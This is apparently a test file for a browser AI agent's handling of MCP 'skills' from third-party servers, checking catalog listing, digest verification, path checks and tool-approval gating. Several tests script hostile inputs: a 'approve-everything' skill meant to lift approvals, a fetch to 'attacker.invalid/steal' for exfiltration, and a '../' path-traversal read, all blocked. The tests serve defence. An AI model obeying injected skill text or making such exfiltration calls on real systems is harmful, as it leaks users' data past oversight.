import 'fake-indexeddb/auto'
import assert from 'node:assert/strict'
import test from 'node:test'
import {
  startLocalMcpServer,
  SKILL_MARKERS,
  type ILocalMcpServer,
  type McpProtocol,
} from '@dudko.dev/test-servers'
import { jsonSchema, tool } from 'ai'
import {
  createAgent,
  markCodeExecution,
  SPAWN_SUBAGENT_TOOL,
  type Agent,
  type AgentEvent,
  type BrowserAgentConfig,
  type ToolApprovalRequest,
} from '../dist/index.js'
import { connectMcpHttp, type ConnectedMcp, type McpHttpServerConfig } from '../dist/mcp.js'
import { scriptedModel, stageOf, type CallInfo, type Reply } from './helpers/scripted-model.ts'

// MCP skills (`skills: true` on a server, the `io.modelcontextprotocol/skills` extension) in the
// browser agent: the real test server over real sockets (2026-07-28), the connector, the agent
// with a scripted model. The shared rules are tested case by case in the Node package's
// `tests/mcp-skills-shared.test.ts`; this is the wiring of this package around them.

const EXT = 'io.modelcontextprotocol/skills'
const HONEST = [
  'docs/git-workflow',
  'docs/pdf-processing',
  'docs/acme/billing/refunds',
  'docs/acme/support/refunds',
]

interface Wire {
  bodies: Record<string, unknown>[]
  fetch: typeof fetch
}
const recorder = (): Wire => {
  const bodies: Record<string, unknown>[] = []
  return {
    bodies,
    fetch: ((input: RequestInfo | URL, init?: RequestInit) => {
      if (typeof init?.body === 'string' && init.body) {
        try {
          bodies.push(JSON.parse(init.body) as Record<string, unknown>)
        } catch {
          /* not JSON */
        }
      }
      return fetch(input, init)
    }) as typeof fetch,
  }
}
const methodsOf = (wire: Wire): string[] => wire.bodies.map((b) => String(b.method))
const declaresSkills = (wire: Wire): boolean =>
  wire.bodies.some((b) => {
    const params = b.params as Record<string, unknown> | undefined
    const meta = params?._meta as Record<string, unknown> | undefined
    const caps = (meta?.['io.modelcontextprotocol/clientCapabilities'] ?? params?.capabilities) as
      { extensions?: Record<string, unknown> } | undefined
    return caps?.extensions?.[EXT] !== undefined
  })

type Calls = { name: string; args: unknown }[]

/** Plans one step (with `planned` skills), makes `calls` one per round, then reports. */
const actor =
  (scenario: () => { planned?: string[]; calls?: Calls; helper?: Calls }) =>
  (info: CallInfo): Reply => {
    const s = scenario()
    const helper = info.user.includes('[[HELPER]]')
    switch (stageOf(info)) {
      case 'planner':
        return {
          text: JSON.stringify({
            thought: 'Plan.',
            steps: [{ description: 'Step s1' }],
            ...(s.planned && !helper ? { skills: s.planned } : {}),
          }),
        }
      case 'replanner':
        return { text: JSON.stringify({ decision: 'finish', reason: 'done' }) }
      case 'synthesizer':
        return { text: 'All done.' }
      default: {
        const next = (helper ? s.helper : s.calls)?.[info.toolResults]
        return next ? { toolCalls: [next] } : { text: 'Step done.' }
      }
    }
  }

interface Rig {
  server: ILocalMcpServer
  mcp: ConnectedMcp
  wire: Wire
  logs: string[]
  events: AgentEvent[]
  calls: CallInfo[]
  scenario: { planned?: string[]; calls?: Calls; helper?: Calls }
  agent: (extra?: Partial<BrowserAgentConfig>) => Promise<Agent>
  changed: string[]
}

const withRig = async (
  opts: { protocol?: McpProtocol; server?: Partial<McpHttpServerConfig> },
  body: (rig: Rig) => Promise<void>,
): Promise<void> => {
  const server = await startLocalMcpServer({ protocol: opts.protocol ?? 'modern', skills: true })
  const wire = recorder()
  const logs: string[] = []
  const changed: string[] = []
  const mcp = await connectMcpHttp(
    {
      docs: {
        url: server.url,
        protocol: 'modern',
        skills: true,
        fetch: wire.fetch,
        ...opts.server,
      },
    },
    {
      onLog: (level, message) => logs.push(`${level} ${message}`),
      onToolsChanged: (name) => changed.push(name),
    },
  )
  const state = { scenario: {} as Rig['scenario'] }
  const model = scriptedModel(actor(() => state.scenario))
  const events: AgentEvent[] = []
  const sink = Object.fromEntries(
    (['debug', 'info', 'warn', 'error'] as const).map((level) => [
      level,
      (...args: unknown[]) => logs.push(`agent ${level} ${args.map(String).join(' ')}`),
    ]),
  )
  try {
    await body({
      server,
      mcp,
      wire,
      logs,
      events,
      calls: model.calls,
      changed,
      get scenario() {
        return state.scenario
      },
      set scenario(s) {
        state.scenario = s
      },
      agent: (extra = {}) =>
        createAgent({
          model: model.model,
          toolMode: 'native',
          logLevel: 'debug',
          logger: sink as never,
          ...extra,
          tools: { ...mcp.tools, ...extra.tools },
        }),
    })
  } finally {
    await mcp.close()
    await server.close()
  }
}

const run = (rig: Rig, agent: Agent) =>
  agent.run('Do the work', { onEvent: (e) => rig.events.push(e) })
const callsOf = (result: Awaited<ReturnType<Agent['run']>>) =>
  result.trace.flatMap((s) => s.toolCalls)
const errorOf = (output: unknown): string =>
  output instanceof Error
    ? output.message
    : typeof output === 'string'
      ? output
      : JSON.stringify(output)

test('mcp skills (browser): OFF by default - nothing declared, nothing asked, no catalog', async () => {
  await withRig({ server: { skills: undefined } }, async (rig) => {
    const agent = await rig.agent()
    assert.deepEqual(agent.skills, [])
    assert.equal(declaresSkills(rig.wire), false)
    assert.ok(!methodsOf(rig.wire).some((m) => m.startsWith('skills/')))
    assert.ok(!rig.server.requests.some((r) => r.method.startsWith('skills/')))
  })
})

test('mcp skills (browser): a 2025 connection declares and asks nothing (the extension is 2026-07-28)', async () => {
  await withRig({ protocol: 'dual', server: { protocol: undefined } }, async (rig) => {
    assert.equal(declaresSkills(rig.wire), false)
    assert.ok(!methodsOf(rig.wire).some((m) => m.startsWith('skills/')))
    assert.ok(
      rig.logs.some((l) => /warn .*docs: skills: true needs protocol 'auto' or 'modern'/.test(l)),
    )
    assert.deepEqual((await rig.agent()).skills, [])
  })
  await withRig({ protocol: 'legacy', server: { protocol: 'auto' } }, async (rig) => {
    assert.ok(!rig.server.requests.some((r) => r.method.startsWith('skills/')))
    assert.ok(
      rig.logs.some((l) => /skills: true, but the connection uses 2025-.*needs 2026-07-28/.test(l)),
    )
    assert.deepEqual((await rig.agent()).skills, [])
  })
})

test('mcp skills (browser): ON - the catalog comes with the tools, <server>/<skill>, nothing read', async () => {
  await withRig({}, async (rig) => {
    assert.equal(declaresSkills(rig.wire), true)
    const agent = await rig.agent()
    assert.deepEqual(
      agent.skills.map((s) => [s.name, s.server]),
      HONEST.map((n) => [n, 'docs']),
    )
    assert.deepEqual(rig.server.skillReads, [])
    await run(rig, agent)
    const planner = rig.calls.find((c) => stageOf(c) === 'planner')!
    assert.match(
      planner.system,
      /- docs\/pdf-processing: Extract, fill and assemble PDF documents \[from the MCP server "docs" - third-party\]/,
    )
    assert.deepEqual(rig.server.skillReads, [])
  })
})

test('mcp skills (browser): body on demand under the preamble; a file as text; the planner may pick one', async () => {
  await withRig({}, async (rig) => {
    const agent = await rig.agent()
    rig.scenario = {
      planned: ['docs/git-workflow'],
      calls: [
        { name: 'load_skill', args: { name: 'docs/pdf-processing' } },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'scripts/extract.py' },
        },
      ],
    }
    const result = await run(rig, agent)
    const [load, read] = callsOf(result)
    const loaded = load.output as { content: string; files: string[] }
    assert.match(
      loaded.content,
      /^\[A skill from the MCP server "docs" \(skill:\/\/pdf-processing\/SKILL.md\)/,
    )
    assert.ok(loaded.content.includes(SKILL_MARKERS.pdfProcessing))
    assert.deepEqual(loaded.files, ['references/FORMS.md', 'scripts/extract.py'])
    assert.match(String(read.output), /never a program to run/)
    assert.ok(String(read.output).includes(SKILL_MARKERS.extract))
    // The planner's pick was read before the step, and is in the executor's prompt.
    const executor = rig.calls.find((c) => stageOf(c) === 'executor')!
    assert.match(
      executor.system,
      /### Skill: docs\/git-workflow\n\[A skill from the MCP server "docs"/,
    )
    assert.deepEqual(rig.server.skillReads, [
      'skill://git-workflow/SKILL.md',
      'skill://pdf-processing/SKILL.md',
      'skill://pdf-processing/scripts/extract.py',
    ])
    assert.deepEqual(rig.server.calls, [])
    assert.deepEqual(
      rig.events.flatMap((e) => (e.type === 'skill.activated' ? [[e.name, e.by, e.server]] : [])),
      [
        ['docs/git-workflow', 'plan', 'docs'],
        ['docs/pdf-processing', 'tool', 'docs'],
      ],
    )
    assert.deepEqual(result.skills, ['docs/git-workflow', 'docs/pdf-processing'])
  })
})

test("mcp skills (browser): the host's skill keeps its name; refused entries never reach the catalog", async () => {
  await withRig({}, async (rig) => {
    Object.assign(rig.server.skillFaults, { nameMismatch: true, oversize: true, dynamic: true })
    await rig.mcp.refreshServer('docs')
    const agent = await rig.agent({
      skills: [{ name: 'git-workflow', description: 'Ours', content: 'HOST-GIT-WORKFLOW' }],
    })
    assert.deepEqual(
      agent.skills.map((s) => s.name),
      ['git-workflow', ...HONEST],
    )
    assert.ok(
      rig.logs.some((l) =>
        /agent warn \[agent-web\] \[mcp\] docs: its skill "git-workflow" has the name of one of this agent's own skills/.test(
          l,
        ),
      ),
    )
    for (const why of [
      /wrong-name\/SKILL.md refused/,
      /huge\/SKILL.md refused - it lists 513 files/,
      /generated\/SKILL.md refused - its content is generated/,
    ]) {
      assert.ok(
        rig.logs.some((l) => why.test(l)),
        String(why),
      )
    }
    rig.scenario = { calls: [{ name: 'load_skill', args: { name: 'git-workflow' } }] }
    const result = await run(rig, agent)
    assert.equal((callsOf(result)[0].output as { content: string }).content, 'HOST-GIT-WORKFLOW')
    assert.deepEqual(rig.server.skillReads, [])
  })
})

test('mcp skills (browser): a digest that does not match - nothing of the skill is used', async () => {
  await withRig({}, async (rig) => {
    rig.server.skillFaults.digest = true
    rig.server.skillFaults.changedFile = true
    await rig.mcp.refreshServer('docs')
    const agent = await rig.agent()
    rig.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/tampered' } },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'references/FORMS.md' },
        },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: '../git-workflow/SKILL.md' },
        },
      ],
    }
    const result = await run(rig, agent)
    const [tampered, forms, up] = callsOf(result)
    assert.equal(tampered.ok, false)
    assert.match(errorOf(tampered.output), /does not match the entry the server listed \(digest\)/)
    assert.equal(forms.ok, false)
    assert.match(errorOf(forms.output), /\(digest\)/)
    assert.equal(up.ok, false)
    assert.match(errorOf(up.output), /not a path inside the skill/)
    const seen = JSON.stringify(rig.calls.map((c) => c.options.prompt))
    assert.ok(!seen.includes('TAMPERED-BODY') && !seen.includes(SKILL_MARKERS.forms))
    assert.ok(!rig.server.skillReads.includes('skill://git-workflow/SKILL.md'))
  })
})

test('mcp skills (browser): a list change fires onToolsChanged; refreshServer lists the skills again', async () => {
  await withRig({}, async (rig) => {
    await rig.server.addSkill(
      'release-notes',
      'Write the release notes',
      `# Notes\n\n${SKILL_MARKERS.added}\n`,
    )
    const deadline = Date.now() + 10_000
    while (!rig.changed.includes('docs') && Date.now() < deadline) {
      await new Promise((r) => setTimeout(r, 25))
    }
    assert.deepEqual(rig.changed.slice(0, 1), ['docs'])
    await rig.mcp.refreshServer('docs')
    const agent = await rig.agent()
    assert.ok(agent.skills.some((s) => s.name === 'docs/release-notes'))
  })
})

test('mcp skills (browser): "approve everything" changes nothing; code is asked while acting on one', async () => {
  await withRig({}, async (rig) => {
    rig.server.skillFaults.hostile = true
    await rig.mcp.refreshServer('docs')
    const ran: string[] = []
    const exec = markCodeExecution(
      tool({
        description: 'Run a command',
        inputSchema: jsonSchema<{ cmd: string }>({
          type: 'object',
          properties: { cmd: { type: 'string' } },
          required: ['cmd'],
        }),
        execute: async ({ cmd }) => {
          ran.push(cmd)
          return 'ran'
        },
      }),
    )
    const asked: ToolApprovalRequest[] = []
    const agent = await rig.agent({
      tools: { exec },
      egress: { allow: ['docs.example.com'] },
      toolApproval: {
        mode: 'ask-writes',
        rules: { exec: 'allow' },
        onRequest: (req) => {
          asked.push(req)
          return req.toolName === 'exec'
        },
      },
    })
    rig.scenario = { calls: [{ name: 'exec', args: { cmd: 'before' } }] }
    const [before] = callsOf(await run(rig, agent))
    assert.equal(before.ok, true, 'the rule let it run unasked before any MCP skill')
    rig.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/approve-everything' } },
        { name: 'docs__echo', args: { text: 'write' } },
        { name: 'web_fetch', args: { url: 'https://attacker.invalid/steal' } },
        { name: 'exec', args: { cmd: 'after' } },
      ],
    }
    const result = await run(rig, agent)
    const [load, echo, fetched, after] = callsOf(result)
    assert.ok((load.output as { content: string }).content.includes(SKILL_MARKERS.hostile))
    assert.equal(echo.ok, false, 'the write is still asked, and the "no" stands')
    assert.equal(fetched.ok, false)
    assert.match(errorOf(fetched.output), /allow/)
    assert.equal(after.ok, true)
    assert.deepEqual(
      asked.map((r) => [r.toolName, r.mcpSkills]),
      [
        ['docs__echo', undefined],
        ['exec', ['docs/approve-everything']],
      ],
    )
    assert.deepEqual(ran, ['before', 'after'])
    assert.equal(agent.toolApprovalMode, 'ask-writes')
    assert.deepEqual(rig.server.calls, [])
  })
})

test('mcp skills (browser): a helper the model starts while the run acts on an MCP skill is asked too', async () => {
  await withRig({}, async (rig) => {
    const exec = markCodeExecution(
      tool({
        description: 'Run a command',
        inputSchema: jsonSchema<Record<string, never>>({ type: 'object', properties: {} }),
        execute: async () => 'ran',
      }),
    )
    const asked: ToolApprovalRequest[] = []
    const agent = await rig.agent({
      tools: { exec },
      subagents: { dynamic: true },
      toolApproval: {
        mode: 'autopilot',
        onRequest: (req) => {
          asked.push(req)
          return true
        },
      },
    })
    rig.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: SPAWN_SUBAGENT_TOOL, args: { task: '[[HELPER]] run it', tools: ['exec'] } },
      ],
      helper: [{ name: 'exec', args: {} }],
    }
    await run(rig, agent)
    assert.deepEqual(
      asked.map((r) => [r.toolName, r.mcpSkills, Boolean(r.subagent)]),
      [['exec', ['docs/git-workflow'], true]],
    )
  })
})

test('mcp skills (browser): the planner picks one that fails verification - not activated, nothing shown', async () => {
  await withRig({}, async (rig) => {
    rig.server.skillFaults.digest = true
    await rig.mcp.refreshServer('docs')
    const agent = await rig.agent()
    rig.scenario = { planned: ['docs/tampered'] }
    const result = await run(rig, agent)
    assert.deepEqual(result.skills, [])
    assert.deepEqual(
      rig.events.filter((e) => e.type === 'skill.activated'),
      [],
    )
    const executor = rig.calls.find((c) => stageOf(c) === 'executor')!
    assert.ok(!executor.system.includes('### Skill: docs/tampered'))
    assert.ok(!JSON.stringify(rig.calls.map((c) => c.options.prompt)).includes('TAMPERED-BODY'))
    assert.ok(rig.logs.some((l) => /\[skills\] docs\/tampered is not loaded: .*\(digest\)/.test(l)))
  })
})

test('mcp skills (browser): run_js is asked while the run acts on an MCP skill, even in autopilot', async () => {
  await withRig({}, async (rig) => {
    const asked: ToolApprovalRequest[] = []
    const agent = await rig.agent({
      sandbox: true,
      toolApproval: {
        mode: 'autopilot',
        onRequest: (req) => {
          asked.push(req)
          return false
        },
      },
    })
    rig.scenario = { calls: [{ name: 'run_js', args: { code: '1 + 1' } }] }
    const [free] = callsOf(await run(rig, agent))
    assert.equal(free.ok, true, 'unasked without an MCP skill')
    rig.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'run_js', args: { code: '1 + 1' } },
      ],
    }
    const [, gated] = callsOf(await run(rig, agent))
    assert.equal(gated.ok, false)
    assert.deepEqual(
      asked.map((r) => [r.toolName, r.mcpSkills]),
      [['run_js', ['docs/git-workflow']]],
    )
  })
})
